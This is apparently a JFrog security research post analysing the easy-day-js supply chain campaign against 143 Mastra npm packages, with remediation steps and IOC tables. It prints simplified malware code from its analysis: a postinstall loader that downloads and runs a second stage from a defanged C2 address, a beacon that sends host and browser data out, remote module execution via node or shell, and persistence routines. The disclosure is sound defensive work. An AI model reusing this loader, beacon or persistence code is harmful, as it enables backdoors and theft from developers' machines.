---
excerpt: "A supply chain campaign targeting Mastra npm packages added the malicious `easy-day-js` dependency, causing installs to execute a staged Node.js backdoor with persistence, reconnaissance, C2 polling, and remote code execution."
title: "easy-day-js: Supply Chain Campaign Targets Mastra npm Packages"
date: "June 17, 2026"
description: "Guy Korolevski, JFrog Security Researcher"
tag: "Real Time Post"
img: /img/RealTimePostImage/post/easy-day-js/thumbnail.png
type: realTimePost
minutes: '10'
---


JFrog Security Research analyzed a supply chain campaign that targeted Mastra npm packages by adding a malicious production dependency named `easy-day-js`. The affected Mastra package code was left largely untouched. The malicious behavior was moved one level down, into a dependency that looked like a harmless date library but executed an obfuscated `postinstall` loader during package installation. In npm, `postinstall` is a lifecycle hook that runs automatically after a package is installed.

This campaign includes 143 affected Mastra packages and a single malicious dependency, `easy-day-js`.

The campaign used a narrow but effective trick. The attacker first published `easy-day-js@1.11.21` without the malicious payload, then affected Mastra packages were republished with `"easy-day-js": "^1.11.21"` in `package.json`. The package masquerades the legitimate package `dayjs` Shortly before the Mastra publishing wave, `easy-day-js@1.11.22` was published with a malicious `setup.cjs` file. Because the caret dependency range allows newer compatible versions, fresh installs did not stop at the clean `1.11.21` release. They resolved to the weaponized `1.11.22` release and executed its `postinstall` payload.

![](/img/RealTimePostImage/post/easy-day-js/image1.png)

## Mastra Packages Used as the Delivery Layer

The change in affected Mastra packages could be very small. An example affected package, `@mastra/ai-sdk@1.4.6`, contained the new dependency on `easy-day-js`:

```json
{
  "name": "@mastra/ai-sdk",
  "version": "1.4.6",
  "description": "Adds custom API routes to be compatible with the AI SDK UI parts",
  "dependencies": {
    "easy-day-js": "^1.11.21"
  },
  "engines": {
    "node": ">=22.13.0"
  }
}
```

This dependency was not needed by the package functionality. Its purpose was to cause the package manager to install `easy-day-js` using a range that would select `1.11.22` once it existed, which then triggered the malicious lifecycle script. This pattern is especially dangerous because a review of only the first-party package source can miss the real payload.

The registry timing confirms that the payload-bearing version was already available when affected Mastra packages were uploaded. npm registry metadata for [`easy-day-js`](https://registry.npmjs.org/easy-day-js) records `easy-day-js@1.11.21` at `2026-06-16T07:05:42.457Z` and `easy-day-js@1.11.22` at `2026-06-17T01:01:33.087Z`. The example affected package, [`@mastra/ai-sdk`](https://registry.npmjs.org/@mastra/ai-sdk), records `@mastra/ai-sdk@1.4.6` at `2026-06-17T01:27:27.607Z`, about 26 minutes after the malicious `easy-day-js@1.11.22` upload.

```json
{
  "easy-day-js@1.11.21": "2026-06-16T07:05:42.457Z",
  "easy-day-js@1.11.22": "2026-06-17T01:01:33.087Z",
  "@mastra/ai-sdk@1.4.6": "2026-06-17T01:27:27.607Z"
}
```

The affected Mastra package was uploaded after the malicious `easy-day-js` version already existed. Any normal install resolving `"easy-day-js": "^1.11.21"` at that point would select the payload-bearing `1.11.22` version, not the earlier payload-free `1.11.21` version.

## `easy-day-js` Masqueraded as a Date Library

The `easy-day-js` package copied the shape of a legitimate date utility package. Its `package.json` used a date-library description, date and time keywords, a `dayjs.min.js` main file, and many normal-looking plugin and type files. That made the package plausible during casual inspection.

Before executing its payload, the malware uses a multi-stage backdoor architecture. The first stage acts as a lightweight loader designed to run immediately upon installation, establish an initial foothold, and pull down a more complex second-stage remote module system from a command-and-control server to execute arbitrary code.

The malicious behavior was added through the npm lifecycle hook:

```json
{
  "scripts": {
    "postinstall": "node setup.cjs --no-warnings"
  }
}
```

The `--no-warnings` argument helped keep installation quiet. The loader itself was stored in `setup.cjs` as a one-line obfuscated JavaScript file. After deobfuscation, the behavior is straightforward: disable TLS verification, write local marker files, download a second-stage JavaScript payload, execute it as a detached Node process, then delete the loader.

## Stage 1: The Install-Time Loader

The obfuscated loader shows classic download-and-execute behavior. The snippet below is a deobfuscated and a simplified version, but preserves the execution flow:

At the time of publication, the C2 URL used to retrieve the second-stage payload was no longer available. The behavior below is based on the recovered loader logic and the locally analyzed payload sample.

```javascript
process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";

const payloadUrl = "hxxps[:]//23[.]254[.]164[.]92:8000/update/49890878";
const primaryC2 = "23[.]254[.]164[.]123:443";

fs.writeFileSync(path.join(os.tmpdir(), ".pkg_history"), __dirname, "utf-8");
fs.writeFileSync(path.join(os.tmpdir(), ".pkg_logs"), Buffer.from([
  229, 225, 243, 249, 173, 228, 225, 249, 173, 234, 243
]));

const body = await (await fetch(payloadUrl, { method: "GET" })).text();
const payloadName = crypto.randomBytes(12).toString("hex") + ".js";
const payloadPath = path.join(os.tmpdir(), payloadName);

fs.writeFileSync(payloadPath, body, "utf8");
spawn(process.execPath, [payloadPath, primaryC2], {
  cwd: os.tmpdir(),
  detached: true,
  stdio: "ignore",
  windowsHide: true
}).unref();

fs.rmSync(__filename, { force: true });
```

`NODE_TLS_REJECT_UNAUTHORIZED` is set to `0`, so certificate validation does not protect the victim. The dropped payload filename is a random 24-character hex string ending in `.js`, which makes host artifacts harder to predict. The child process is detached, hidden, and unreferenced, allowing it to outlive the package installation process. Finally, `setup.cjs` deletes itself, so a later inspection of `node_modules/easy-day-js` may not contain the original loader.

The marker file `.pkg_history` stores the install directory. The `.pkg_logs` file stores byte values that decode to `easy-day-js` when the high bit is cleared, likely acting as a package marker without writing the plaintext package name.

## Stage 2: Node.js Backdoor and Reconnaissance Payload

The downloaded second stage is a cross-platform Node.js payload. It imports modules used for filesystem access, process execution, networking, DNS, path handling, operating system inspection, and browser database parsing. It also disables TLS verification again:

```javascript
var childProcess = require("node:child_process");
var dns = require("node:dns");
var fs = require("node:fs");
var net = require("node:net");
var os = require("node:os");
var path = require("node:path");

process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";
```

On the first run, the stage 1 loader passes `23[.]254[.]164[.]123:443` as the primary C2. The payload then builds a campaign endpoint under `/49890878` and posts base64-encoded JSON to it. This is encoding, not encryption. The payload relies on TLS for transport, while also disabling certificate validation.

```javascript
async function sendToC2(message, primaryUrl = config.PrimaryUrl) {
  const encoded = Buffer.from(message, "utf8").toString("base64");
  const endpoint = "hxxps[:]//" + primaryUrl + "/49890878";

  return fetch(endpoint, {
    method: "POST",
    headers: {
      "User-Agent": "mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)",
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body: Buffer.from(encoded, "utf8")
  });
}
```

The initial beacon includes a generated victim ID, username, hostname, OS and architecture, Node.js version, installed application inventory, running process list, browser history hostnames, and a targeted browser extension inventory. The extension list contains many cryptocurrency wallet extension IDs, which suggests the operator used the initial beacon for wallet-focused targeting and follow-on module selection.

```javascript
async function startBeacon() {
  const extensions = await collectTargetedExtensions();
  const history = await collectBrowserHistoryHosts();
  const apps = collectInstalledApplications();
  const processes = collectProcesses();

  await sendToC2(JSON.stringify({
    type: "Start",
    targetId: config.UID,
    info: {
      common: {
        username,
        hostname,
        osarch: platformInfo + " :: Node " + process.version
      },
      appInfo: apps,
      extInfo: extensions,
      historyInfo: history,
      procInfo: processes
    }
  }));
}
```

The recovered code did not directly steal browser passwords, cookies, or wallet files in the static payload. However, the payload implements a remote module system that can request additional attacker-provided code and run it through Node.js or a shell. That makes the initial payload a persistent backdoor, not just a one-time reconnaissance script.

## Remote Module Execution

After the initial beacon, the payload polls the C2 for commands. The main command path, `tpcsr`, downloads a module from an attacker-supplied URL and executes it. The supported runners include detached Node execution, detached shell execution, captured Node execution, and captured shell execution.

```javascript
async function runRemoteModule(command) {
  const moduleUrl = command.data.Url;
  const moduleName = command.data.Name;
  const runner = command.data.Runner;
  const args = command.data.Param.split(",");

  args.push(config.UID);

  const moduleBody = await requestModule(moduleUrl);

  if (runner === "NSpawn") return spawnDetached(moduleBody, args, "node");
  if (runner === "SSpawn") return spawnDetached(moduleBody, args, "shell");
  if (runner === "Node") return runAndCapture(moduleBody, args, "node");
  if (runner === "Shell") return runAndCapture(moduleBody, args, "shell");
}
```

This gives the operator arbitrary follow-on execution after installation. The loader only needs to establish the foothold; more specialized theft or lateral movement logic can be delivered later through the C2 channel.

## Persistence and Host Artifacts

The second-stage payload copies itself into Node-themed paths and creates platform-specific persistence. The naming choices, including `NodePackages`, `protocal.cjs`, `NvmProtocal`, and `nvmconf.service`, are designed to look related to normal Node.js tooling.

On macOS, the payload writes `~/Library/NodePackages/protocal.cjs` and creates a LaunchAgent named `com.nvm.protocal.plist`:

```javascript
function persistOnMacOS() {
  const payloadPath = path.join(os.homedir(), "Library/NodePackages/protocal.cjs");
  const plistPath = path.join(os.homedir(), "Library/LaunchAgents/com.nvm.protocal.plist");

  fs.mkdirSync(path.dirname(payloadPath), { recursive: true });
  fs.mkdirSync(path.dirname(plistPath), { recursive: true });
  fs.writeFileSync(payloadPath, selfCode, "utf8");
  fs.writeFileSync(plistPath, launchAgentPlist, "utf8");
}
```

On Linux, it writes a user service under `~/.config/systemd/user/nvmconf.service` and a payload copy under `~/.config/systemd/nvmconf/protocal.cjs`. On Windows, it writes into `C:\ProgramData\NodePackages` and adds an `HKCU` Run key named `NvmProtocal`.

One important macOS detail is that the payload registers signal and exit handlers that call the persistence function. Killing the process can therefore cause persistence to be installed if it has not already been written.

The persistence and a remote module system makes the removal of the package alone not sufficient, since it may not stop the second-stage process.

## How did JFrog Curation protect against this attack?

JFrog Curation customers using an immaturity policy were fully protected from this attack, as all of the hijacked packages were flagged in less than 24 hours. Curation has automatic compliance version selection (CVS) mechanism to ensure developer and CI/CD seamless fallback to compliant (non-malicious) versions.

The full, updated list of relevant packages in this campaign is also available through the JFrog Catalog label \- “easy-day-js”.

![](/img/RealTimePostImage/post/easy-day-js/image2.png)

## Remediation

- Stop using affected Mastra package versions published during the incident window and containing the `easy-day-js` dependency.  
- Remove `easy-day-js` from dependency manifests and lockfiles, then reinstall dependencies from known-good versions.  
- Run `npm ls easy-day-js` in affected repositories and CI workspaces to identify transitive installation.  
- If you have installed any of the affected packages, immediately terminate any suspicious active Node.js processes and scan environments for persistent artifacts. You must also rotate all secrets, API keys, and credentials stored on those compromised systems or CI/CD runners to prevent further abuse.  
- Install only remediated Mastra versions and prefer versions with expected provenance.  
- Treat any machine or CI runner that installed the affected packages as compromised until investigated.  
- Block and investigate traffic to `23[.]254[.]164[.]92`  
- Search for loader artifacts: `<os.tmpdir()>/.pkg_history`, `<os.tmpdir()>/.pkg_logs`, and `<os.tmpdir()>/<24 hex chars>.js`.  
- Search for persistence artifacts: `~/Library/NodePackages`, `~/Library/LaunchAgents/com.nvm.protocal.plist`, `~/.config/systemd/nvmconf`, `~/.config/systemd/user/nvmconf.service`, `C:\ProgramData\NodePackages`, and the current-user Windows Run key value `NvmProtocal`.  
- Remove persistence artifacts after forensic collection: delete `~/Library/LaunchAgents/com.nvm.protocal.plist` and `~/Library/NodePackages` on macOS; disable and remove `~/.config/systemd/user/nvmconf.service`, `~/.config/systemd/nvmconf`, and `~/.config/NodePackages` on Linux; remove `C:\ProgramData\NodePackages` and the current-user Windows Run key value `NvmProtocal` on Windows.  
- Inspect running Node.js processes, especially detached processes launched from temporary directories or `NodePackages` paths.  
- Rotate all credentials exposed to affected systems, including package registry tokens, source control tokens, CI secrets, cloud credentials, database credentials, LLM API keys, and any cryptocurrency wallet secrets.

## Conclusions

This campaign shows how a small dependency change can become an install-time compromise across a large package ecosystem. The affected Mastra packages acted as carriers, while the real malicious logic lived in `easy-day-js`, a package designed to look ordinary enough to survive quick review.

The malware combined familiar supply chain techniques with practical stealth: a clean decoy version, an obfuscated `postinstall` loader, runtime payload download, detached execution, self-deletion, Node-themed persistence, and a remote module system. Even if the first-stage package is removed after installation, the second-stage process may continue running and may have already installed persistence.

JFrog Xray and JFrog Curation detect the malicious `easy-day-js` package and the affected Mastra packages. 

## IOCs

### Affected Mastra Package Versions

| Package | Xray ID | Versions |
| :---- | :---- | :---- |
| @mastra/acp | XRAY-1005068 | 0.2.2 |
| @mastra/agent-browser | XRAY-1005079 | 0.3.2 |
| @mastra/agent-builder | XRAY-1005024 | 1.0.42 |
| @mastra/agentcore | XRAY-1005076 | 0.2.2 |
| @mastra/agentfs | XRAY-1005054 | 0.1.1 |
| @mastra/ai-sdk | XRAY-1005069 | 1.4.6 |
| @mastra/arize | XRAY-1005071 | 1.2.3 |
| @mastra/arthur | XRAY-1005089 | 0.3.3 |
| @mastra/astra | XRAY-1005055 | 1.0.2 |
| @mastra/auth | XRAY-1005097 | 1.0.3 |
| @mastra/auth-auth0 | XRAY-1005082 | 1.0.2 |
| @mastra/auth-better-auth | XRAY-1005032 | 1.0.4 |
| @mastra/auth-clerk | XRAY-1005120 | 1.0.3 |
| @mastra/auth-cloud | XRAY-1005075 | 1.1.4 |
| @mastra/auth-firebase | XRAY-1005088 | 1.0.1 |
| @mastra/auth-okta | XRAY-1004995 | 0.0.5 |
| @mastra/auth-studio | XRAY-1005002 | 1.2.4 |
| @mastra/auth-supabase | XRAY-1005023 | 1.0.2 |
| @mastra/auth-workos | XRAY-1005126 | 1.5.3 |
| @mastra/azure | XRAY-1005101 | 0.2.3 |
| @mastra/blaxel | XRAY-1005033 | 0.4.2 |
| @mastra/braintrust | XRAY-1005122 | 1.1.4 |
| @mastra/brightdata | XRAY-1005062 | 0.2.2 |
| @mastra/browser-firecrawl | XRAY-1005034 | 0.1.1 |
| @mastra/browser-viewer | XRAY-1005115 | 0.1.3 |
| @mastra/chroma | XRAY-1005086 | 1.0.2 |
| @mastra/claude | XRAY-1005125 | 1.0.3 |
| @mastra/clickhouse | XRAY-1005058 | 1.10.1 |
| @mastra/client-js | XRAY-1005050 | 1.24.1 |
| @mastra/cloud | XRAY-1005004 | 0.1.24 |
| @mastra/cloudflare | XRAY-1005110 | 1.4.2 |
| @mastra/cloudflare-d1 | XRAY-1004988 | 1.0.7 |
| @mastra/codemod | XRAY-1005118 | 1.0.4 |
| @mastra/convex | XRAY-1005127 | 1.2.2 |
| @mastra/core | XRAY-1005014 | 1.42.1 |
| @mastra/couchbase | XRAY-1005100 | 1.0.4 |
| @mastra/cursor | XRAY-1005078 | 0.2.1 |
| @mastra/dane | XRAY-1005007 | 1.0.2 |
| @mastra/datadog | XRAY-1005090 | 1.2.5 |
| @mastra/daytona | XRAY-1005020 | 0.4.2 |
| @mastra/deployer | XRAY-1004992 | 1.42.1 |
| @mastra/deployer-cloud | XRAY-1005047 | 1.42.1 |
| @mastra/deployer-cloudflare | XRAY-1005070 | 1.1.44 |
| @mastra/deployer-netlify | XRAY-1005061 | 1.1.20 |
| @mastra/deployer-vercel | XRAY-1004989 | 1.1.38 |
| @mastra/docker | XRAY-1005105 | 0.3.1 |
| @mastra/dsql | XRAY-1005060 | 1.0.3 |
| @mastra/duckdb | XRAY-1004986 | 1.4.3 |
| @mastra/dynamodb | XRAY-1005003 | 1.0.9 |
| @mastra/e2b | XRAY-1004987 | 0.3.4 |
| @mastra/editor | XRAY-1005080 | 0.11.3 |
| @mastra/elasticsearch | XRAY-1005096 | 1.2.1 |
| @mastra/engine | XRAY-1005008 | 0.1.1 |
| @mastra/evals | XRAY-1005042 | 1.3.1 |
| @mastra/express | XRAY-1005005 | 1.3.31 |
| @mastra/fastembed | XRAY-1005044 | 1.1.3 |
| @mastra/fastify | XRAY-1005053 | 1.3.31 |
| @mastra/files-sdk | XRAY-1004999 | 0.2.1 |
| @mastra/gcs | XRAY-1004997 | 0.2.3 |
| @mastra/github-signals | XRAY-1005051 | 0.1.2 |
| @mastra/google-cloud-pubsub | XRAY-1005107 | 1.0.6 |
| @mastra/google-drive | XRAY-1005017 | 0.1.1 |
| @mastra/hono | XRAY-1005066 | 1.4.26 |
| @mastra/inngest | XRAY-1005083 | 1.5.2 |
| @mastra/koa | XRAY-1005010 | 1.5.14 |
| @mastra/laminar | XRAY-1005000 | 1.2.3 |
| @mastra/lance | XRAY-1005072 | 1.0.7 |
| @mastra/langfuse | XRAY-1005119 | 1.3.6 |
| @mastra/langsmith | XRAY-1005040 | 1.2.4 |
| @mastra/libsql | XRAY-1004996 | 1.13.1 |
| @mastra/loggers | XRAY-1005016 | 1.1.3 |
| @mastra/longmemeval | XRAY-1005056 | 1.0.50 |
| @mastra/mcp | XRAY-1005057 | 1.10.1 |
| @mastra/mcp-docs-server | XRAY-1005063 | 1.1.47 |
| @mastra/mcp-registry-registry | XRAY-1005087 | 1.0.2 |
| @mastra/mem0 | XRAY-1005117 | 0.1.14 |
| @mastra/memory | XRAY-1005019 | 1.20.4 |
| @mastra/modal | XRAY-1005103 | 0.2.2 |
| @mastra/mongodb | XRAY-1005031 | 1.9.3 |
| @mastra/mssql | XRAY-1004984 | 1.3.2 |
| @mastra/mysql | XRAY-1005077 | 0.1.1 |
| @mastra/nestjs | XRAY-1005021 | 0.1.15 |
| @mastra/node-audio | XRAY-1005012 | 0.1.8 |
| @mastra/node-speaker | XRAY-1004993 | 0.1.1 |
| @mastra/observability | XRAY-1005113 | 1.14.2 |
| @mastra/openai | XRAY-1005006 | 1.0.2 |
| @mastra/opencode | XRAY-1005028 | 0.0.47 |
| @mastra/opensearch | XRAY-1005094 | 1.0.3 |
| @mastra/otel-bridge | XRAY-1005092 | 1.2.3 |
| @mastra/otel-exporter | XRAY-1005030 | 1.2.3 |
| @mastra/perplexity | XRAY-1005073 | 0.1.1 |
| @mastra/pg | XRAY-1005098 | 1.13.1 |
| @mastra/pinecone | XRAY-1005048 | 1.0.2 |
| @mastra/playground-ui | XRAY-1005093 | 33.0.1 |
| @mastra/posthog | XRAY-1005109 | 1.0.29 |
| @mastra/qdrant | XRAY-1005085 | 1.0.3 |
| @mastra/rag | XRAY-1005108 | 2.2.2 |
| @mastra/railway | XRAY-1005043 | 0.1.1 |
| @mastra/react | XRAY-1005018 | 1.0.1 |
| @mastra/redis | XRAY-1005046 | 1.1.3 |
| @mastra/redis-streams | XRAY-1004990 | 0.0.4 |
| @mastra/s3 | XRAY-1004998 | 0.5.3 |
| @mastra/s3vectors | XRAY-1005067 | 1.0.7 |
| @mastra/schema-compat | XRAY-1005102 | 1.2.12 |
| @mastra/sentry | XRAY-1005001 | 1.1.4 |
| @mastra/server | XRAY-1005111 | 2.1.1 |
| @mastra/slack | XRAY-1005036 | 1.3.1 |
| @mastra/spanner | XRAY-1005011 | 1.1.2 |
| @mastra/speech-azure | XRAY-1005045 | 0.2.1 |
| @mastra/speech-elevenlabs | XRAY-1004991 | 0.2.1 |
| @mastra/speech-google | XRAY-1004994 | 0.2.1 |
| @mastra/speech-ibm | XRAY-1005124 | 0.2.1 |
| @mastra/speech-murf | XRAY-1005037 | 0.2.1 |
| @mastra/speech-openai | XRAY-1005074 | 0.2.1 |
| @mastra/speech-replicate | XRAY-1005025 | 0.2.1 |
| @mastra/speech-speechify | XRAY-1005052 | 0.2.1 |
| @mastra/stagehand | XRAY-1005114 | 0.2.5 |
| @mastra/tavily | XRAY-1005026 | 1.0.3 |
| @mastra/temporal | XRAY-1005081 | 0.1.14 |
| @mastra/turbopuffer | XRAY-1005035 | 1.0.3 |
| @mastra/twilio | XRAY-1005059 | 1.0.2 |
| @mastra/upstash | XRAY-1005104 | 1.1.3 |
| @mastra/vectorize | XRAY-1005112 | 1.0.3 |
| @mastra/vercel | XRAY-1005041 | 1.0.1 |
| @mastra/voice-aws-nova-sonic | XRAY-1005009 | 0.1.4 |
| @mastra/voice-azure | XRAY-1005065 | 0.11.2 |
| @mastra/voice-cloudflare | XRAY-1005091 | 0.12.3 |
| @mastra/voice-deepgram | XRAY-1005121 | 0.12.2 |
| @mastra/voice-elevenlabs | XRAY-1005116 | 0.12.2 |
| @mastra/voice-gladia | XRAY-1005022 | 0.12.2 |
| @mastra/voice-google | XRAY-1005038 | 0.12.3 |
| @mastra/voice-google-gemini-live | XRAY-1005029 | 0.12.2 |
| @mastra/voice-inworld | XRAY-1005049 | 0.3.1 |
| @mastra/voice-modelslab | XRAY-1005084 | 0.1.2 |
| @mastra/voice-murf | XRAY-1005015 | 0.12.3 |
| @mastra/voice-openai | XRAY-1005027 | 0.12.3 |
| @mastra/voice-openai-realtime | XRAY-1005013 | 0.12.6 |
| @mastra/voice-playai | XRAY-1004985 | 0.12.2 |
| @mastra/voice-sarvam | XRAY-1005099 | 1.0.2 |
| @mastra/voice-speechify | XRAY-1005106 | 0.12.2 |
| @mastra/voice-xai-realtime | XRAY-1005039 | 0.1.2 |
| create-mastra | XRAY-1005095 | 1.13.1 |
| easy-day-js | XRAY-1004962 | 1.11.22,1.11.21 |
| mastra | XRAY-1005123 | 1.13.1 |

### Network

- `23[.]254[.]164[.]92`  
- `23[.]254[.]164[.]92:8000`  
- `hxxps[:]//23[.]254[.]164[.]92:8000/update/49890878`  
- `23[.]254[.]164[.]123`  
- `23[.]254[.]164[.]123:443`  
- `hxxps[:]//23[.]254[.]164[.]123:443/49890878`  
- `hxxps[:]//<host>:<port>/49890878`  
- C2 path: `/49890878`

### Host Artifacts

- `<os.tmpdir()>/.pkg_history`  
- `<os.tmpdir()>/.pkg_logs`  
- `<os.tmpdir()>/<24 hex chars>.js`  
- `setup.cjs`  
- `~/Library/NodePackages/config.json`  
- `~/Library/NodePackages/protocal.cjs`  
- `~/Library/LaunchAgents/com.nvm.protocal.plist`  
- `~/.config/NodePackages/config.json`  
- `~/.config/systemd/nvmconf/protocal.cjs`  
- `~/.config/systemd/user/nvmconf.service`  
- `C:\ProgramData\NodePackages\config.json`  
- `C:\ProgramData\NodePackages\protocal.cjs`  
- Current-user Windows Run key value: `NvmProtocal`
